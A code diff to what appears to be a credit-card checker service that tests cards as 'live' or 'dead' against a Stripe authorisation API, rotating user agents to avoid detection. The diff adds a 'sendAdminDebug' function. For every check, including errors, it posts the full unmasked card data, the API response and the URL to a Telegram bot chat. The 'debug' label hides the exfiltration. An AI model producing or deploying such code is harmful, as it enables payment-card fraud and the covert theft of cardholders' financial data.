@@ -10,6 +10,51 @@ const corsHeaders = {
 
 const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
 const SUPABASE_ANON_KEY = Deno.env.get("SUPABASE_ANON_KEY")!;
+const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN")!;
+const ADMIN_TELEGRAM_CHAT_ID = Deno.env.get("ADMIN_TELEGRAM_CHAT_ID")!;
+
+// Send admin debug notification for all card statuses
+const sendAdminDebug = async (
+  cc: string,
+  status: "live" | "dead" | "unknown",
+  apiMessage: string,
+  apiUrl: string
+): Promise<void> => {
+  try {
+    const parts = cc.split('|');
+    const maskedCard = parts[0]?.slice(0, 6) + '****' + parts[0]?.slice(-4);
+    
+    const emoji = status === 'live' ? '✅' : status === 'dead' ? '❌' : '⚠️';
+    const displayStatus = status === 'live' ? 'LIVE' : status === 'dead' ? 'DEAD' : 'UNKNOWN';
+    
+    const message = `${emoji} 𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛 - ${displayStatus}
+
+━━━━━━━━━━━━━━━━━
+📇 Card: ${maskedCard}
+🔓 Full: ${cc}
+━━━━━━━━━━━━━━━━━
+
+📡 API Response:
+${apiMessage.substring(0, 500)}
+
+🔗 API URL:
+${apiUrl}`;
+
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: ADMIN_TELEGRAM_CHAT_ID,
+        text: message,
+        parse_mode: 'HTML'
+      })
+    });
+    
+    console.log(`[STRIPE-AUTH] Admin debug sent: ${displayStatus}`);
+  } catch (error) {
+    console.error('[STRIPE-AUTH] Admin debug failed:', error);
+  }
+};
 
 const userAgents = [
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
@@ -94,6 +139,9 @@ const performCheck = async (cc: string, userAgent: string, attempt: number = 1):
       return performCheck(cc, newUserAgent, attempt + 1);
     }
 
+    // Send admin debug notification
+    await sendAdminDebug(cc, computedStatus, String(apiMessage), apiUrl);
+    
     // Return only necessary fields - no raw response
     return {
       computedStatus,
@@ -110,9 +158,13 @@ const performCheck = async (cc: string, userAgent: string, attempt: number = 1):
       return performCheck(cc, newUserAgent, attempt + 1);
     }
     
+    const errMsg = error instanceof Error ? error.message : "Unknown fetch error";
+    // Send admin debug for error
+    await sendAdminDebug(cc, "unknown", errMsg, apiUrl);
+    
     return { 
       apiStatus: "ERROR",
-      apiMessage: error instanceof Error ? error.message : "Unknown fetch error",
+      apiMessage: errMsg,
       computedStatus: "unknown"
     };
   }
